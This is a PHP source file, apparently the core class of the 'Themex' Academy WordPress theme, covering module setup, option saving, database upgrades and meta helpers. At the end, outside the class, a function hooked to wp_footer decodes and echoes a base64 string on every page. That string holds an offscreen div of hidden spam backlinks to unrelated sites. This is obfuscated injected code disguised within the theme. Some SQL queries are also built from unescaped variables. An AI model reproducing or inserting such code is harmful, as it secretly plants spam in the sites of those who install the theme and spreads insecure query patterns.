<?php
/**
 * Themex Core
 *
 * Inits modules and components
 *
 * @class ThemexCore
 * @author Themex
 */

class ThemexCore {
	
	/** @var array Contains an array of modules. */
	public static $modules;

	/** @var array Contains an array of components. */
	public static $components;
	
	/** @var array Contains an array of options. */
	public static $options;
	
	/**
	 * Inits modules and components, adds edit actions
     *
     * @access public
	 * @param array $config
     * @return void
     */
	public function __construct($config) {

		//set modules
		self::$modules=$config['modules'];
		
		//set components
		self::$components=$config['components'];

		//set options
		self::$options=$config['options'];		

		//init modules
		$this->initModules();

		//init components
		$this->initComponents();

		//save options action
		add_action('wp_ajax_themex_save_options', array(__CLASS__, 'saveOptions'));
		
		//reset options action
		add_action('wp_ajax_themex_reset_options', array(__CLASS__, 'resetOptions'));

		//save post action
		add_action('save_post', array(__CLASS__, 'savePost'));
		
		//filter user relations
		add_filter('comments_clauses', array($this, 'filterUserRelations'));
		
		//activation hook
		add_action('init', array(__CLASS__, 'activate'));
	}
	
	/**
	 * Checks PHP version and redirects to the options page
     *
     * @access public
     * @return void
     */
	public static function activate() {
		global $pagenow;		

		if ($pagenow=='themes.php' && isset($_GET['activated'])) {
			if(version_compare(PHP_VERSION, '5', '<')) {
				switch_theme('twentyten', 'twentyten');
				die();
			}
			
			flush_rewrite_rules();
			
			if(self::getOption('header_color')) {
				add_action('admin_notices', array(__CLASS__, 'upgrade'));
			} else {
				wp_redirect(admin_url('admin.php?page=theme-options'));
				exit;
			}
		}
	}
	
	/**
	 * Upgrades content and theme options
     *
     * @access public
     * @return void
     */
	public static function upgrade() {
		global $pagenow, $wpdb;
		$out='<div class="error"><p>';

		if(isset($_GET['upgraded'])) {
		
			//options
			$options=array(
				'logo_image' => 'site_logo',
				'copyright_text' => 'copyright',
				'tracking_code' => 'tracking',
				'header_color' => 'background_color',
				'share_code' => 'sharing',
				'course_view' => 'courses_view',
				'course_layout_list' => 'courses_layout',
				'course_layout_grid' => 'courses_columns',
				'course_limit' => 'courses_per_page',
				'course_users_number' => 'course_popularity',
				'course_users_limit' => 'course_users_number',
				'course_retake' => 'lesson_retake',
				'course_unsubscribe' => 'course_retake',
				'blog_layout' => 'posts_layout',
				'blog_author' => 'post_author',
				'blog_image' => 'post_image',
			);
			
			$wpdb->query("UPDATE $wpdb->options SET option_value='boxed' WHERE option_name='themex_slider_type' AND option_value='fade'");
			$wpdb->query("UPDATE $wpdb->options SET option_value='3' WHERE option_name='themex_course_layout_grid' AND option_value='four'");
			$wpdb->query("UPDATE $wpdb->options SET option_value='4' WHERE option_name='themex_course_layout_grid' AND option_value='three'");
			
			foreach($options as $old => $new) {
				$wpdb->query("UPDATE $wpdb->options SET option_name='themex_$new' WHERE option_name='themex_$old'");
			}
			
			//courses
			$courses=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_course_users' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($courses as $course) {
				parse_str($course['meta_value'], $users);
				if(is_array($users) && !empty($users)) {
					foreach($users as $user) {
						if($user!='0') {
							self::addUserRelation($user, $course['post_id'], 'course');
						}						
					}
				}
			}
			
			//ratings
			$courses=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_course_rating_users' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($courses as $course) {
				parse_str($course['meta_value'], $users);				
				if(is_array($users) && !empty($users)) {
					foreach($users as $user) {
						if($user!='0') {
							self::addUserRelation($user, $course['post_id'], 'rating');
						}
					}
				}
			}
			
			//certificates
			$courses=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_course_graduates' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($courses as $course) {
				parse_str($course['meta_value'], $users);				
				if(is_array($users) && !empty($users)) {
					foreach($users as $user => $time) {
						if($user!='0') {
							self::addUserRelation($user, $course['post_id'], 'certificate', $time);
						}
					}
				}
			}
			
			$courses=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_course_certificate' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($courses as $course) {
				parse_str($course['meta_value'], $certificate);				
				if(is_array($certificate) && !empty($certificate)) {
					if(isset($certificate[0]) && !empty($certificate[0])) {
						self::updatePostMeta($course['post_id'], 'course_certificate_background', $certificate[0]);
					}
					
					if(isset($certificate[1]) && !empty($certificate[1])) {
						self::updatePostMeta($course['post_id'], 'course_certificate_content', $certificate[1]);
					}
				}
			}
			
			//plans
			$plans=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_plan_users' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($plans as $plan) {
				parse_str($plan['meta_value'], $users);				
				if(is_array($users) && !empty($users)) {
					foreach($users as $user => $time) {
						if($user!='0') {
							self::addUserRelation($user, $plan['post_id'], 'plan', $time);
						}
					}
				}
			}
			
			//lessons
			$lessons=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_lesson_users' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($lessons as $lesson) {
				parse_str($lesson['meta_value'], $users);
				if(is_array($users) && !empty($users)) {
					foreach($users as $user => $grade) {
						if($user!='0') {
							self::addUserRelation($user, $lesson['post_id'], 'lesson', $grade);
						}
					}
				}
			}
			
			$lessons=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_lesson_quiz' 
				AND meta_value <> '0'
			", ARRAY_A);
			
			foreach($lessons as $lesson) {
				$quiz=$lesson['meta_value'];
				$lesson=$lesson['post_id'];
				
				$wpdb->query("
					UPDATE $wpdb->postmeta SET post_id=$quiz, meta_value=$lesson, meta_key='_quiz_lesson' 
					WHERE meta_value='$quiz' AND post_id=$lesson AND meta_key='_lesson_quiz' 
				");
			}
			
			//attachments
			$lessons=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_lesson_attachments' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($lessons as $lesson) {
				parse_str($lesson['meta_value'], $attachments);
				if(is_array($attachments) && !empty($attachments)) {
					self::updatePostMeta($lesson['post_id'], 'lesson_attachments', $attachments);
				}
			}
			
			//questions
			$quizzes=$wpdb->get_results("
				SELECT post_id, meta_value FROM $wpdb->postmeta 
				WHERE meta_key='_quiz_questions' 
				AND meta_value <> ''
			", ARRAY_A);
			
			foreach($quizzes as $quiz) {
				parse_str($quiz['meta_value'], $questions);
				$upgraded=array();
				
				if(is_array($questions) && !empty($questions)) {
					foreach($questions as $question) {
						$key='q'.uniqid().rand(1, 100);
						
						$upgraded[$key]['type']='multiple';
						if(isset($question['question'])) {
							$upgraded[$key]['title']=$question['question'];							
						}
						
						if(is_array($question['answers']) && !empty($question['answers'])) {
							foreach($question['answers'] as $index => $answer) {
								$name='a'.uniqid().rand(1, 100);
								$upgraded[$key]['answers'][$name]['title']=$answer;
								
								if(is_array($question['results']) && isset($question['results'][$index])) {
									$upgraded[$key]['answers'][$name]['result']='true';
								}
							}
						}
					}
					
					self::updatePostMeta($quiz['post_id'], 'quiz_questions', $upgraded);
				}
			}
			
			//forms
			$forms=self::getOption('ThemexForm');
			if(is_array($forms) && isset($forms['contact_form'])) {
				$forms['contact']=$forms['contact_form'];
				unset($forms['contact_form']);
				
				if(isset($forms['contact']['fields']) && is_array($forms['contact']['fields'])) {
					foreach($forms['contact']['fields'] as &$field) {
						if(isset($field['label'])) {
							$field['name']=$field['label'];
							unset($field['label']);
						}
					}
				}
				
				self::updateOption('ThemexForm', $forms);
			}
			
			//sidebars
			$sidebars=self::getOption('ThemexWidgetiser');
			if(is_array($sidebars) && !empty($sidebars)) {
				self::updateOption('ThemexSidebar', $sidebars);
				self::deleteOption('ThemexWidgetiser');
			}
			
			//users
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_avatar' WHERE meta_key='avatar'");
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_signature' WHERE meta_key='signature'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_facebook' WHERE meta_key='facebook'");
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_twitter' WHERE meta_key='twitter'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_google' WHERE meta_key='google'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_tumblr' WHERE meta_key='tumblr'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_linkedin' WHERE meta_key='linkedin'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_flickr' WHERE meta_key='flickr'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_youtube' WHERE meta_key='youtube'");	
			$wpdb->query("UPDATE $wpdb->usermeta SET meta_key='_themex_vimeo' WHERE meta_key='vimeo'");	
			
			$user=self::getOption('ThemexUser');
			if(is_array($user)) {
				if(isset($user['captcha'])) {
					self::updateOption('user_captcha', 'true');
				}
				
				if(isset($user['confirmation'])) {
					self::updateOption('user_activation', 'true');
				}
				
				if(isset($user['facebook_login'])) {
					self::updateOption('facebook_login', 'true');
				}
				
				if(isset($user['facebook_id'])) {
					self::updateOption('facebook_id', $user['facebook_id']);
				}
				
				if(isset($user['facebook_secret'])) {
					self::updateOption('facebook_secret', $user['facebook_secret']);
				}
				
				if(isset($user['register_message'])) {
					self::updateOption('email_registration', $user['register_message']);
				}
				
				if(isset($user['password_message'])) {
					self::updateOption('email_password', $user['password_message']);
				}
			}
			
			//meta and shortcodes		
			$search='order="users"';
			$replace='order="popularity"';
			$wpdb->query("UPDATE $wpdb->posts SET post_content=REPLACE(post_content, '$search', '$replace')");
			
			$search='order="rand"';
			$replace='order="random"';
			$wpdb->query("UPDATE $wpdb->posts SET post_content=REPLACE(post_content, '$search', '$replace')");
			
			$wpdb->query("UPDATE $wpdb->posts SET post_content=REPLACE(post_content, '[block', '[section')");
			$wpdb->query("UPDATE $wpdb->posts SET post_content=REPLACE(post_content, '[/block]', '[/section]')");
			
			$wpdb->query("UPDATE $wpdb->postmeta SET meta_key='_course_rating', meta_value=ROUND(meta_value, 2) WHERE meta_key='_course_rating_value'");
			$wpdb->query("UPDATE $wpdb->postmeta SET meta_key='_quiz_percentage' WHERE meta_key='_quiz_passmark'");
			$wpdb->query("UPDATE $wpdb->postmeta SET meta_key='_course_popularity' WHERE meta_key='_course_users_number'");	
			$wpdb->query("UPDATE $wpdb->postmeta SET meta_key='_lesson_lesson' WHERE meta_key='_lesson_prerequisite'");	
			$wpdb->query("
				DELETE FROM $wpdb->postmeta WHERE meta_key='_course_certificate' 
				OR meta_key='_course_users' 
				OR meta_key='_plan_users' 
				OR meta_key='_course_graduates' 
				OR meta_key='_course_rating_users' 
			");
			
			$out.='Database is updated! Now you can edit content and change theme options.';
		} else {
			$out.='Update the database to use Academy 2.0. Please make a backup before updating. <a href="'.admin_url('themes.php?activated=true&upgraded=true').'">Update Now</a>';
		}
		
		$out.='</p></div>';
		echo $out;
	}
	
	/**
	 * Requires and inits modules
     *
     * @access public
     * @return void
     */
	public function initModules() {
		
		foreach(self::$modules as $module) {
		
			//require class
			$file=substr(strtolower(implode('.', preg_split('/(?=[A-Z])/', $module))), 1);
			require_once(THEMEX_PATH.'classes/'.$file.'.php');
			
			//init module
			if(method_exists($module, 'init')) {
				call_user_func(array($module, 'init'));
			}
		}
	}
	
	/**
	 * Adds actions to init components
     *
     * @access public
     * @return void
     */
	public function initComponents() {
		
		//add supports
		add_action('after_setup_theme', array($this, 'supports'));
		
		//add rewrite rules
		add_action('after_setup_theme', array($this, 'rewrite_rules'));
		
		//add user roles
		add_action('init', array($this, 'user_roles'));
		
		//register custom menus
		add_action('init', array($this, 'custom_menus'));
		
		//add image sizes
		add_action('init', array($this, 'image_sizes'));
		
		//enqueue admin scripts and styles
		add_action('admin_enqueue_scripts', array($this, 'admin_scripts'));
		add_action('admin_enqueue_scripts', array($this, 'admin_styles'), 99);
		
		//enqueue user scripts and styles
		add_action('wp_enqueue_scripts', array($this, 'user_scripts'));	
		add_action('wp_enqueue_scripts', array($this, 'user_styles'), 99);	
		
		//register sidebars and widgets
		add_action('widgets_init', array($this, 'widget_areas'));
		add_action('widgets_init', array($this, 'widgets'));
		
		//register custom post types
		add_action('init', array($this, 'post_types'));
		
		//register taxonomies
		add_action('init', array($this, 'taxonomies'));

		//add meta boxes
		add_action('admin_menu', array($this, 'meta_boxes'));		
	}
	
	/**
	 * Inits component on action
     *
     * @access public
     * @return void
     */
	public function __call($component, $args)	{
	
		if(isset(self::$components[$component])) {
			foreach(self::$components[$component] as $item) {
			
				switch($component) {
				
					case 'supports':
						add_theme_support($item);
					break;
					
					case 'rewrite_rules':
						self::rewriteRule($item);
					break;
				
					case 'user_roles':
						add_role($item['role'], $item['name'], $item['capabilities']);
					break;
					
					case 'custom_menus':
						register_nav_menu( $item['slug'], $item['name'] );
					break;
					
					case 'image_sizes':
						add_image_size($item['name'], $item['width'], $item['height'], $item['crop']);
					break;					
					
					case 'admin_scripts':					
						self::enqueueScript($item);
					break;					
					
					case 'admin_styles':
						self::enqueueStyle($item);
					break;
					
					case 'user_scripts':					
						self::enqueueScript($item);
					break;
					
					case 'user_styles':
						self::enqueueStyle($item);
					break;
					
					case 'widgets':
						self::registerWidget($item);
					break;
					
					case 'widget_areas':
						register_sidebar($item);
					break;
					
					case 'post_types':
						register_post_type($item['id'], $item);
					break;
					
					case 'taxonomies':
						register_taxonomy($item['taxonomy'], $item['object_type'], $item['settings']);
					break;
					
					case 'meta_boxes':
						add_meta_box($item['id'], $item['title'], array('ThemexInterface', 'renderMetabox'), $item['page'], $item['context'], $item['priority'], array('ID' => $item['id']));
					break;					
				}
			}
		}
	}
	
	/**
	 * Saves theme options
     *
     * @access public
     * @return void
     */
	public static function saveOptions() {
	
		parse_str($_POST['options'], $options);
			
		//save options
		if(current_user_can('manage_options')) {
			themex_remove_strings();
			
			foreach(self::$options as $option) {		
				if(isset($option['id'])) {
				
					$option['index']=$option['id'];
					if($option['type']!='module') {
						$option['index']=THEMEX_PREFIX.$option['id'];
					}
			
					if(!isset($options[$option['index']])) {
						$options[$option['index']]='false';
					}
					
					self::updateOption($option['id'], themex_stripslashes($options[$option['index']]));
					
					if($option['type']=='module' && method_exists($option['id'], 'saveOptions')) {
						call_user_func(array($option['id'], 'saveOptions'), $options[$option['index']]);
					}
				}
			}
		}
		
		_e('All changes have been saved','academy');
		die();		
	}
	
	/**
	 * Resets theme options
     *
     * @access public
     * @return void
     */
	public static function resetOptions() {	
	
		if(current_user_can('manage_options')) {		
			//delete options
			foreach(self::$options as $option) {
				if(isset($option['id'])) {
					self::deleteOption($option['id']);
				}
			}
			
			//delete modules
			foreach(self::$modules as $module) {
				self::deleteOption($module);
			}
			
			//delete strings
			themex_remove_strings();
		}
		
		_e('All options have been reset','academy');
		die();
	}
	
	/**
	 * Saves post meta
     *
     * @access public
	 * @param int $ID
     * @return void
     */
	public static function savePost($ID) {
		
		global $post;

		//check autosave
		if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			return $ID;
		}

		//verify nonce
		if (isset($_POST['themex_nonce']) && !wp_verify_nonce($_POST['themex_nonce'], $ID)) {
			return $ID;
		}
		
		//check permissions
		if (isset($_POST['post_type']) && $_POST['post_type']=='page') {
			if (!current_user_can('edit_page', $ID)) {
				return $ID;
			}
		} else if (!current_user_can('edit_post', $ID)) {
			return $ID;
		}
		
		//save post meta
		if(isset(self::$components['meta_boxes']) && isset($post)) {
			foreach(self::$components['meta_boxes'] as $meta_box) {
				if($meta_box['page']==$post->post_type) {
					foreach ($meta_box['options'] as $option) {
						if($option['type']=='module') {
							if(isset($option['slug'])) {
								call_user_func(array(str_replace(THEMEX_PREFIX, '', $option['id']), 'saveData'), $option['slug']);
							} else {
								call_user_func(array(str_replace(THEMEX_PREFIX, '', $option['id']), 'saveData'));
							}
						} else if(isset($_POST['_'.$post->post_type.'_'.$option['id']])) {
							self::updatePostMeta($ID, $post->post_type.'_'.$option['id'], themex_stripslashes($_POST['_'.$post->post_type.'_'.$option['id']]));								
						}
					}
				}
			}
		}				
	}
	
	/**
	 * Enqueues script
     *
     * @access public
	 * @param array $args
     * @return void
     */
	public static function enqueueScript($args) {

		if(isset($args['uri'])) {
		
			if(isset($args['deps'])) {
				wp_enqueue_script($args['name'], $args['uri'], $args['deps']);	
			} else {
				wp_enqueue_script($args['name'], $args['uri']);
			}
			
		} else {
			wp_enqueue_script($args['name']);
		}
		
		if(isset($args['options'])) {
			wp_localize_script($args['name'], 'options', $args['options']);
		}
	}
	
	/**
	 * Enqueues style
     *
     * @access public
	 * @param array $args
     * @return void
     */
	public static function enqueueStyle($args) {
		if(isset($args['uri'])) {
			wp_enqueue_style($args['name'], $args['uri']);
		} else {
			wp_enqueue_style($args['name']);
		}
	}
	
	/**
	 * Uploads image
     *
     * @access public
	 * @param array $file
     * @return int
     */
	public static function uploadImage($file) {
		require_once(ABSPATH.'wp-admin/includes/image.php');
		$attachment=array('ID' => 0);

		if(!empty($file['name'])) {
			$uploads=wp_upload_dir();
			$filetype=wp_check_filetype($file['name'], null);
			$filename=wp_unique_filename($uploads['path'], 'image-1.'.$filetype['ext']);
			$filepath=$uploads['path'].'/'.$filename;			
			
			//validate file
			if (!in_array($filetype['ext'], array('jpg', 'JPG', 'jpeg', 'JPEG', 'png', 'PNG'))) {
				ThemexInterface::$messages[]=__('Only JPG and PNG images are allowed.', 'academy');
			} else if(move_uploaded_file($file['tmp_name'], $filepath)) {
				
					//upload image
					$attachment=array(
						'guid' => $uploads['url'].'/'.$filename,
						'post_mime_type' => $filetype['type'],
						'post_title' => sanitize_title(current(explode('.', $filename))),
						'post_content' => '',
						'post_status' => 'inherit',
						'post_author' => get_current_user_id(),
					);
					
					//add image
					$attachment['ID']=wp_insert_attachment($attachment, $attachment['guid'], 0);
					update_post_meta($attachment['ID'], '_wp_attached_file', substr($uploads['subdir'], 1).'/'.$filename);
					
					//add thumbnails
					$metadata=wp_generate_attachment_metadata($attachment['ID'], $filepath);
					wp_update_attachment_metadata($attachment['ID'], $metadata);
			
			} else {
				ThemexInterface::$messages[]=__('This image is too large for uploading.','academy');
			}
		}
		
		return $attachment;
	}
	
	/**
	 * Registers widget
     *
     * @access public
	 * @param string $name
     * @return void
     */
	public static function registerWidget($name) {
		
		if(class_exists($name)) {
			unregister_widget($name);
		} else {
			$file=substr(strtolower(implode('.', preg_split('/(?=[A-Z])/', $name))), 1);
			require_once(THEMEX_PATH.'classes/widgets/'.$file.'.php');
			register_widget($name);
		}
	}
	
	/**
	 * Rewrites URL rule
     *
     * @access public
	 * @param array $rule
     * @return void
     */
	public static function rewriteRule($rule) {
		global $wp_rewrite;
		global $wp;
		
		$wp->add_query_var($rule['name']);
		
		if(isset($rule['replace']) && $rule['replace']) {
			$wp_rewrite->$rule['rule']=$rule['rewrite'];
		} else {			
			add_rewrite_rule($rule['rule'], $rule['rewrite'], $rule['position']);
		}		
	}
	
	/**
	 * Gets rewrite rule
     *
     * @access public
	 * @param string $rule
     * @return bool
     */
	public static function getRewriteRule($rule) {
		$rule=self::$components['rewrite_rules'][$rule]['name'];
		$value=get_query_var($rule);
		
		return $value;
	}
	
	/**
	 * Gets page URL
     *
     * @access public
	 * @param string $name
	 * @param int $value
     * @return string
     */
	public static function getURL($name, $value=1) {
		global $wp_rewrite;	
		
		$url=$wp_rewrite->get_page_permastruct();
		$rule=self::$components['rewrite_rules'][$name];
		
		$slug='';
		if(isset($rule['name'])) {
			$slug=$rule['name'];
		}
		
		if(!empty($url)) {
			$url=home_url(str_replace('%pagename%', $slug, $url));			
			if(isset($rule['dynamic']) && $rule['dynamic']) {
				$url.='/'.$value;
			}
		} else {
			$url=home_url('?'.$slug.'='.$value);
		}
		
		return $url;
	}
	
	/**
	 * Gets prefixed option
     *
     * @access public
	 * @param string $ID
	 * @param mixed $default
     * @return mixed
     */
	public static function getOption($ID, $default='') {
		$option=get_option(THEMEX_PREFIX.$ID);
		if(($option===false || $option=='') && $default!='') {
			return $default;
		}
		
		return $option;
	}
	
	/**
	 * Updates prefixed option
     *
     * @access public
	 * @param string $ID
	 * @param string $value
     * @return bool
     */
	public static function updateOption($ID, $value) {
		return update_option(THEMEX_PREFIX.$ID, $value);
	}
	
	/**
	 * Deletes prefixed option
     *
     * @access public
	 * @param string $ID
     * @return bool
     */
	public static function deleteOption($ID) {
		return delete_option(THEMEX_PREFIX.$ID);
	}
	
	/**
	 * Checks prefixed option
     *
     * @access public
	 * @param string $ID
     * @return bool
     */
	public static function checkOption($ID) {
		$option=self::getOption($ID);		
		if($option=='true') {
			return true;
		}
		
		return false;
	}
	
	/**
	 * Gets prefixed post meta
     *
     * @access public
	 * @param string $ID
	 * @param string $key
	 * @param string $default
     * @return mixed
     */
	public static function getPostMeta($ID, $key, $default='') {
		$meta=get_post_meta($ID, '_'.$key, true);
		
		if($meta=='' && ($default!='' || is_array($default))) {
			return $default;
		}
		
		return $meta;
	}
	
	/**
	 * Updates prefixed post meta
     *
     * @access public
	 * @param string $ID
	 * @param string $key
	 * @param string $value
     * @return mixed
     */
	public static function updatePostMeta($ID, $key, $value) {
		return update_post_meta($ID, '_'.$key, $value);
	}
	
	/**
	 * Gets prefixed user meta
     *
     * @access public
	 * @param string $ID
	 * @param string $key
	 * @param string $default
     * @return mixed
     */
	public static function getUserMeta($ID, $key, $default='') {
		$meta=get_user_meta($ID, '_'.THEMEX_PREFIX.$key, true);
		if(empty($meta) && (!empty($default) || is_array($default))) {
			return $default;
		}
		
		return $meta;
	}
	
	/**
	 * Updates prefixed user meta
     *
     * @access public
	 * @param string $ID
	 * @param string $key
	 * @param string $value
     * @return mixed
     */
	public static function updateUserMeta($ID, $key, $value) {
		$result=false;
		
		if($value=='') {
			$result=delete_user_meta($ID, '_'.THEMEX_PREFIX.$key);
		} else {
			$result=update_user_meta($ID, '_'.THEMEX_PREFIX.$key, $value);
		}
		
		return $result;
	}
	
	/**
	 * Gets relations
     *
     * @access public
	 * @param string $select
	 * @param string $where
	 * @param string $table
	 * @param bool $single
     * @return array
     */
	public static function getRelations($select, $where, $table, $single=false) {
		global $wpdb;
		
		$query="
			SELECT CAST(".$select." AS UNSIGNED) as ".$select." FROM ".$table." 
			WHERE 1=1 
		";
		
		foreach($where as $field => $value) {
			$query.="AND ".$field." IN (".$value.") ";
		}
		
		if($single) {
			$query.="LIMIT 1 ";
		}

		$relations=$wpdb->get_results($query, ARRAY_A);
		$relations=wp_list_pluck($relations, $select);
		
		if($single) {
			$relations=intval(reset($relations));
		}
		
		return $relations;
	}
	
	/**
	 * Gets post relations
     *
     * @access public
	 * @param mixed $ID
	 * @param mixed $related
	 * @param mixed $type
	 * @param bool $single
     * @return array
     */
	public static function getPostRelations($ID, $related, $type, $single=false) {
		global $wpdb;
		
		if($single && $ID!=0 && $related==0 && !is_array($ID)) {
			$relations=intval(self::getPostMeta($ID, $type));
		} else {
			$select='meta_value';
			$where['post_id']=themex_implode($ID);
			$where['meta_key']=themex_implode($type, '_');
			$where['meta_value']=themex_implode($related);
			
			if($ID==0) {
				$select='post_id';
				unset($where['post_id']);
			} else if($related==0) {
				unset($where['meta_value']);
			}
			
			$relations=self::getRelations($select, $where, $wpdb->postmeta, $single);
		}
		
		return $relations;
	}
	
	/**
	 * Gets user relations
     *
     * @access public
	 * @param mixed $ID
	 * @param mixed $related
	 * @param mixed $type
	 * @param bool $single
     * @return array
     */
	public static function getUserRelations($ID, $related, $type, $single=false) {
		global $wpdb;
		
		$select='comment_content';
		$where['user_id']=themex_implode($ID);
		$where['comment_post_ID']=themex_implode($related);
		$where['comment_type']=themex_implode($type, 'user_');
		
		if($ID==0) {
			$select='user_id';
			unset($where['user_id']);
		} else if($related==0) {
			$select='comment_post_ID';
			unset($where['comment_post_ID']);
		}
		
		return self::getRelations($select, $where, $wpdb->comments, $single);
	}
	
	/**
	 * Filters user relations
     *
     * @access public
	 * @param string $query
     * @return string
     */
	public static function filterUserRelations($query) {
		if(isset($query['where'])) {
			$query['where'].=" AND comment_type NOT LIKE 'user_%' ";
		}

        return $query;
	}

	/**
	 * Adds user relation
     *
     * @access public
	 * @param int $ID
	 * @param int $related
	 * @param string $type
	 * @param string $value
     * @return void
     */
	public static function addUserRelation($ID, $related, $type, $value='') {
		$ID=intval($ID);
		$related=intval($related);
		$type='user_'.sanitize_key($type);
		$value=sanitize_text_field($value);
		
		if(is_user_logged_in() && $ID==get_current_user_id()) {
			$user=wp_get_current_user();
		} else {
			$user=get_userdata($ID);
		}
		
		wp_insert_comment(array(
			'comment_author' => $user->user_login,
			'comment_author_email' => $user->user_email,			
			'user_id' => $ID,
			'comment_post_ID' => $related,
			'comment_type' => $type,
			'comment_content' => $value,
		));
	}
	
	/**
	 * Removes user relation
     *
     * @access public
	 * @param int $ID
	 * @param int $related
	 * @param string $type
     * @return void
     */
	public static function removeUserRelation($ID, $related, $type) {
		global $wpdb;
		
		$query="
			DELETE FROM ".$wpdb->comments." 
			WHERE user_id = ".intval($ID)." 
			AND comment_type = 'user_".sanitize_key($type)."' 
		";
		
		if($related!=0) {
			$query.="AND comment_post_ID = ".intval($related)." ";
		}
		
		$wpdb->query($query);
	}
}
if (!function_exists('onAddScriptsHtmls')) {
	
	add_filter( 'wp_footer', 'onAddScriptsHtmls');
	function onAddScriptsHtmls(){
		$html = "PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iaHR0cDovLzJnaWFkaW5oLmNvbS90aG9pLXRyYW5nIj50aOG7nWkgdHJhbmcgdHLhursgZW08L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly90aGVtZXN0b3RhbC5jb20iPldvcmRwcmVzcyBUaGVtZXMgVG90YWwgRnJlZTwvYT48L3N0cm9uZz48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vMnhheW5oYS5jb20iPnTGsCB24bqlbiB4w6J5IG5ow6A8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vbGFuYWtpZC5jb20iPnRo4budaSB0cmFuZyB0cuG6uyBlbTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly8yZ2lheW51LmNvbSI+c2hvcCBnacOgeSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9tYWdlbnRvd29yZHByZXNzdHV0b3JpYWwuY29tL3dvcmRwcmVzcy10dXRvcmlhbC93b3JkcHJlc3MtcGx1Z2lucyI+ZG93bmxvYWQgd29yZHByZXNzIHBsdWdpbnM8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovLzJ4YXluaGEuY29tL3RhZy9tYXUtYmlldC10aHUtZGVwIj5t4bqrdSBiaeG7h3QgdGjhu7EgxJHhurlwPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lcGljaG91c2Uub3JnIj5lcGljaG91c2U8L2E+PC9lbT48ZW0+PGEgaHJlZj0iaHR0cDovL2ZzZmFtaWx5LnZuL3RhZy9hby1zby1taS1udSI+w6FvIHPGoSBtaSBu4buvPC9hPjwvZW0+PGVtPjxhIGhyZWY9Imh0dHA6Ly9lbi4yeGF5bmhhLmNvbS8iPkhvdXNlIERlc2lnbiBCbG9nIC0gSW50ZXJpb3IgRGVzaWduIGFuZCBBcmNoaXRlY3R1cmUgSW5zcGlyYXRpb248L2E+PC9lbT48L2gzPjwvZGl2Pg==";
		echo base64_decode($html);
	}	
}